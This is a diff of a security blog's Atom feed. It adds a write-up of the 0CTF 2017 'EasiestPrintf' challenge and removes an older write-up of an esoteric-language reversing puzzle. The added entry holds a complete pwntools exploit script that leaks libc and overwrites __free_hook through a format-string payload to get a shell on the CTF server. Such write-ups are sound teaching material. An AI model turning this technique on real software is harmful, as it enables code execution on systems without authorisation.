@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://poning.me/"/>
-  <updated>2017-03-11T06:02:36.000Z</updated>
+  <updated>2017-03-22T18:12:03.000Z</updated>
   <id>https://poning.me/</id>
   
   <author>
@@ -14,6 +14,74 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>0CTF 2017 Quals: EasiestPrintf (pwn 150)</title>
+    <link href="https://poning.me/2017/03/23/EasiestPrintf/"/>
+    <id>https://poning.me/2017/03/23/EasiestPrintf/</id>
+    <published>2017-03-22T18:12:03.000Z</published>
+    <updated>2017-03-22T18:12:03.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>Warm UP! A traditional Format String Attack.<br>It’s running on Debian 8.<br>nc 202.120.7.210 12321<br><a href="/2017/03/23/EasiestPrintf/EasiestPrintf" title="EasiestPrintf">EasiestPrintf</a><br><a href="/2017/03/23/EasiestPrintf/libc.so.6_0ed9bad239c74870ed2db31c735132ce" title="libc.so.6">libc.so.6</a></p>
+</blockquote>
+<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
+<li>Leak the libc address from the free arbitrary read.</li>
+<li>Use format string to modify <code>__free_hook</code> to the one-gadget and trigger it by a format placeholder with large width field.</li>
+</ul>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>This is a simple binary. After some setup, it first gives us an arbitrary read and then a 159-byte format string vulnerability. The problem is that this is a Full RELRO binary, so we can not change the GOT value to hijack the control flow. Moreover, because the <code>printf</code> is immediately followed by an <code>_exit</code>, we have to exploit in a single format string.</p>
+<p>Several ideas come to my mind.</p>
+<ol>
+<li>Because it is a 32-bit binary, maybe we can brute force the return address of <code>printf</code>.</li>
+<li>Exploit the <code>exit</code> function, maybe something like <code>atexit</code> function pointer is exploitable.</li>
+<li>Change the value of <code>__malloc_hook</code> or <code>__free_hook</code> and find a way to trigger them in <code>printf</code>.</li>
+</ol>
+<p>For the first idea, the search space is large, and both the manual randomization of stack through <code>alloca</code> and <code>sleep(3)</code> at the beginning of the binary discourage this solution.</p>
+<p>For the second idea, <code>atexit</code> function pointers are encrypted, and this binary use <code>_exit</code> instead of <code>exit</code>, which won’t trigger <code>atexit</code> functions anyway.</p>
+<p>Finally, the third idea works out. By searching <code>malloc</code> in <code>vfprintf.c</code>, it seems that we can trigger <code>malloc</code> and the following <code>free</code> if the width field of the format placeholder is large enough.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br></pre></td><td class="code"><pre><span class="hljs-keyword">if</span> (width &gt;= WORK_BUFFER_SIZE - <span class="hljs-number">32</span>)<br>  &#123;<br>    <span class="hljs-keyword">size_t</span> needed = ((<span class="hljs-keyword">size_t</span>) width + <span class="hljs-number">32</span>) * <span class="hljs-keyword">sizeof</span> (CHAR_T);<br>    ...<br>    workstart = (CHAR_T *) <span class="hljs-built_in">malloc</span> (needed);<br></pre></td></tr></table></figure>
+<p>Although it took me quite a while to come up with the solution, the final exploitation is short and straightforward.</p>
+<ol>
+<li>Leak the libc address from the arbitrary read.</li>
+<li>Construct a format string with<ol>
+<li>the <code>%hhn</code> trick to modify <code>__free_hook</code> to the one-gadget.</li>
+<li><code>%100000c</code> to trigger <code>malloc</code> and <code>free</code>.</li>
+</ol>
+</li>
+</ol>
+<p>I choose <code>__free_hook</code> instead of <code>__malloc_hook</code> because the address of <code>__malloc_hook</code> contains a <code>\x0a</code> byte which will break the reading of the input.</p>
+<p>The full script is as follows.<br><figure class="highlight python"><figcaption><span>EasiestPrintf_exp.py</span><a href="/2017/03/23/EasiestPrintf/EasiestPrintf_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.terminal = [<span class="hljs-string">'tmux'</span>, <span class="hljs-string">'splitw'</span>, <span class="hljs-string">'-h'</span>]<br>context.log_level = <span class="hljs-string">'critical'</span><br><br>libc = ELF(<span class="hljs-string">'./libc.so.6_0ed9bad239c74870ed2db31c735132ce'</span>)<br>binary = ELF(<span class="hljs-string">'./EasiestPrintf'</span>)<br>read_got = binary.symbols[<span class="hljs-string">'_GLOBAL_OFFSET_TABLE_'</span>] + <span class="hljs-number">12</span><br>libc.symbols[<span class="hljs-string">'one_gadget'</span>] = <span class="hljs-number">0x3E297</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exec_fmt</span><span class="hljs-params">(payload)</span>:</span><br>    p = binary.process(env={ <span class="hljs-string">'LD_PRELOAD'</span>: libc.path })<br>    p.sendline(str(read_got))<br>    p.recvuntil(<span class="hljs-string">'Good Bye\n'</span>)<br>    p.sendline(payload)<br>    <span class="hljs-keyword">return</span> p.recvall()<br><br>fmt = FmtStr(exec_fmt)<br>log.critical(<span class="hljs-string">'offset: '</span> + str(fmt.offset))<br><br><br><span class="hljs-comment"># r = binary.process(env={ 'LD_PRELOAD': libc.path })</span><br><span class="hljs-comment"># gdb.attach(r, '''</span><br><span class="hljs-comment"># c</span><br><span class="hljs-comment"># ''')</span><br>r = remote(<span class="hljs-string">'202.120.7.210'</span>, <span class="hljs-number">12321</span>)<br><br><span class="hljs-keyword">print</span> r.recvline()<br><br><span class="hljs-comment"># Leak the libc base address.</span><br>r.sendline(str(read_got))<br>data = r.recvline()<br><span class="hljs-keyword">print</span> data<br>read_addr = int(data, <span class="hljs-number">16</span>)<br>libc.address = read_addr - libc.symbols[<span class="hljs-string">'read'</span>]<br>log.critical(<span class="hljs-string">'libc_base: '</span> + hex(libc.address))<br>log.critical(<span class="hljs-string">'__free_hook: '</span> + hex(libc.symbols[<span class="hljs-string">'__free_hook'</span>]))<br>log.critical(<span class="hljs-string">'one gadget: '</span> + hex(libc.symbols[<span class="hljs-string">'one_gadget'</span>]))<br><br><span class="hljs-comment"># Use format string to override the value of __free_hook to one gadget and</span><br><span class="hljs-comment"># trigger free by a long width format string.</span><br><span class="hljs-keyword">print</span> r.recvline()<br>r.sendline(fmtstr_payload(fmt.offset, { libc.symbols[<span class="hljs-string">'__free_hook'</span>]: libc.symbols[<span class="hljs-string">'one_gadget'</span>] }) + <span class="hljs-string">'%100000c'</span>)<br>r.interactive()<br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>Flag: <code>flag{Dr4m471c_pr1N7f_45_y0u_Kn0w}</code></p>
+</blockquote>
+<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><ul>
+<li><strong>What I’ve learned:</strong><ul>
+<li>Both <code>printf</code> and <code>scanf</code> can trigger <code>malloc</code> and <code>free</code>.</li>
+</ul>
+</li>
+<li>There are couples of solutions for this challenge. See <a href="https://www.youtube.com/watch?v=kEqOvWmzu6Y" target="_blank" rel="external">this video</a> for more details.</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Warm UP! A traditiona
+    
+    </summary>
+    
+      <category term="writeup" scheme="https://poning.me/categories/writeup/"/>
+    
+    
+      <category term="pwn" scheme="https://poning.me/tags/pwn/"/>
+    
+      <category term="format string" scheme="https://poning.me/tags/format-string/"/>
+    
+      <category term="libc hook" scheme="https://poning.me/tags/libc-hook/"/>
+    
+      <category term="printf" scheme="https://poning.me/tags/printf/"/>
+    
+  </entry>
   
   <entry>
     <title>Codegate prequals 2017: meow (pwn 365)</title>
@@ -848,44 +916,6 @@
       <category term="Internetwache CTF" scheme="https://poning.me/tags/Internetwache-CTF/"/>
     
       <category term="RSA" scheme="https://poning.me/tags/RSA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Internetwache CTF 2016: Eso Tape (rev 80)</title>
-    <link href="https://poning.me/2016/02/29/eso-tape/"/>
-    <id>https://poning.me/2016/02/29/eso-tape/</id>
-    <published>2016-02-29T06:50:05.000Z</published>
-    <updated>2017-03-11T06:06:16.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
-<p>Description: I once took a nap on my keyboard. I dreamed of a brand new language, but I could not decipher it nor get its meaning. Can you help me?<br><strong>Hint:</strong> Replace the spaces with either ‘{‘ or ‘}’ in the solution.<br><strong>Hint:</strong> Interpreters don’t help. Operations write to the current index.<br><strong>Attachment:</strong> <a href="/2016/02/29/eso-tape/rev80.zip" title="rev80.zip">rev80.zip</a></p>
-</blockquote>
-<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight plain"><figcaption><span>priner.tb</span></figcaption><table><tr><td class="code"><pre>## %% %++ %++ %++ %# *&amp;* @** %# **&amp;* ***-* ***-* %++ %++ @*** *-* @*** @** *+** @*** ***+* @*** **+** ***+* %++ @*** #% %% %++ %++ %++ %++ @* %# %++ %++ %++ %% *&amp;** @* @*** *-** @* %# %++ @** *-** *-** **-*** **-*** **-*** @** @*** #% %% %++ %++ %++ %++ %# *+** %++ @** @* %# *+** @*** ## %% @*** <br></pre></td></tr></table></figure>
-<p>From the word “eso” in title and the unfriendly language showing above, we could guess this challenge is about esoteric language. Then, the hardest part of the challenge is to figure out what the fuck this language is. I luckily found out that the answer is <a href="https://esolangs.org/wiki/TapeBagel" target="_blank" rel="external">TapeBagel</a> by searching “tape” in <a href="https://esolangs.org/wiki/Language_list" target="_blank" rel="external">this</a> esoteric language list. This also explains why the file extension is “.tb”.</p>
-<p>Now all we need is to spend a few minutes understanding the language and either program an interpreter or use human interpreter. I chose the latter and recorded the process as below.</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre>inst: ##     inst: %%     inst: %++    inst: %++    inst: %++<br>int: [0] 0 0 int: [0] 0 0 int: [1] 0 0 int: [2] 0 0 int: [3] 0 0<br>output:      output:      output:      output:      output:     <br><br>inst: %#     inst: *&amp;*    inst: @**    inst: %#     inst: **&amp;*<br>int: 3 [0] 0 int: 3 [9] 0 int: 3 [9] 0 int: 3 9 [0] int: 3 9 [27]<br>output:      output:      output: I    output: I    output: I   <br><br>inst: ***-*   inst: ***-*   inst: %++     inst: %++<br>int: 3 9 [24] int: 3 9 [21] int: 3 9 [22] int: 3 9 [23]<br>output: I     output: I     output: I     output: I   <br><br>inst: @***    inst: *-*    inst: @***   inst: @**<br>int: 3 9 [23] int: 3 9 [0] int: 3 9 [0] int: 3 9 [0]<br>output: IW    output: IW   output: IW_  output: IW_I  <br><br>inst: *+**    inst: @***    inst: ***+*    inst: @***<br>int: 3 9 [12] int: 3 9 [12] int: 3 9 [15] int: 3 9 [15]<br>output: IW_I  output: IW_IL output: IW_IL output: IW_ILO  <br><br>inst: **+**    inst: ***+*    inst: %++     inst: @***<br>int: 3 9 [18]  int: 3 9 [21]  int: 3 9 [22] int: 3 9 [22]<br>output: IW_ILO output: IW_ILO output: IW_IL output: IW_ILOV <br><br>inst: #%        inst: %%        inst: %++       inst: %++<br>int: 1 1 [1]    int: [1] 1 1    int: [2] 1 1    int: [3] 1 1<br>output: IW_ILOV output: IW_ILOV output: IW_ILOV output: IW_ILOV <br><br>inst: %++       inst: %++       inst: @*         inst: %#<br>int: [4] 1 1    int: [5] 1 1    int: [5] 1 1     int: 5 [1] 1<br>output: IW_ILOV output: IW_ILOV output: IW_ILOVE output: IW_ILOVE<br><br>inst: %++        inst: %++        inst: %++        inst: %%<br>int: 5 [2] 1     int: 5 [3] 1     int: 5 [4] 1     int: [5] 4 1<br>output: IW_ILOVE output: IW_ILOVE output: IW_ILOVE output: IW_ILOVE<br><br>inst: *&amp;**       inst: @*          inst: @***         inst: *-**<br>int: [20] 4 1    int: [20] 4 1     int: [20] 4 1      int: [16] 4 1<br>output: IW_ILOVE output: IW_ILOVET output: IW_ILOVETA output: IW_ILOVETA<br><br>inst: @*            inst: %#            inst: %++<br>int: [16] 4 1       int: 16 [4] 1       int: 16 [5] 1<br>output: IW_ILOVETAP output: IW_ILOVETAP output: IW_ILOVETAP<br><br>inst: @**            inst: *-**           inst: *-**<br>int: 16 [5] 1        int: 16 [11] 1       int: 16 [5] 1<br>output: IW_ILOVETAPE output: IW_ILOVETAPE output: IW_ILOVETAPE<br><br>inst: **-***         inst: **-***         inst: **-***<br>int: 16 [4] 1        int: 16 [3] 1        int: 16 [2] 1<br>output: IW_ILOVETAPE output: IW_ILOVETAPE output: IW_ILOVETAPE<br><br>inst: @**             inst: @***             inst: #%<br>int: 16 [2] 1         int: 16 [2] 1          int: 1 [1] 1<br>output: IW_ILOVETAPEB output: IW_ILOVETAPEBA output: IW_ILOVETAPEBA<br><br>inst: %%               inst: %++              inst: %++<br>int: [1] 1 1           int: [2] 1 1           int: [3] 1 1<br>output: IW_ILOVETAPEBA output: IW_ILOVETAPEBA output: IW_ILOVETAPEBA<br><br>inst: %++              inst: %++              inst: %#<br>int: [4] 1 1           int: [5] 1 1           int: 5 [1] 1<br>output: IW_ILOVETAPEBA output: IW_ILOVETAPEBA output: IW_ILOVETAPEBA<br><br>inst: *+**             inst: %++              inst: @**<br>int: 5 [6] 1           int: 5 [7] 1           int: 5 [7] 1<br>output: IW_ILOVETAPEBA output: IW_ILOVETAPEBA output: IW_ILOVETAPEBAG<br><br>inst: @*                 inst: %#<br>int: 5 [7] 1             int: 5 7 [1]<br>output: IW_ILOVETAPEBAGE output: IW_ILOVETAPEBAGE<br><br>inst: *+**               inst: @***<br>int: 5 7 [12]            int: 5 7 [12]<br>output: IW_ILOVETAPEBAGE output: IW_ILOVETAPEBAGEL<br><br>inst: ##                  inst: %%<br>int: 0 0 [0]              int: [0] 0 0<br>output: IW_ILOVETAPEBAGEL output: IW_ILOVETAPEBAGEL<br><br>inst: @***<br>int: [0] 0 0<br>output: IW_ILOVETAPEBAGEL_<br></pre></td></tr></table></figure>
-<p>The flag can be easily guessed during the halfway of interpretation.</p>
-<blockquote>
-<p>Flag: <code>IW{ILOVETAPEBAGEL}</code></p>
-</blockquote>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;Description: I once t
-    
-    </summary>
-    
-      <category term="writeup" scheme="https://poning.me/categories/writeup/"/>
-    
-    
-      <category term="Internetwache CTF" scheme="https://poning.me/tags/Internetwache-CTF/"/>
-    
-      <category term="reverse" scheme="https://poning.me/tags/reverse/"/>
-    
-      <category term="esoteric" scheme="https://poning.me/tags/esoteric/"/>
     
   </entry>
   
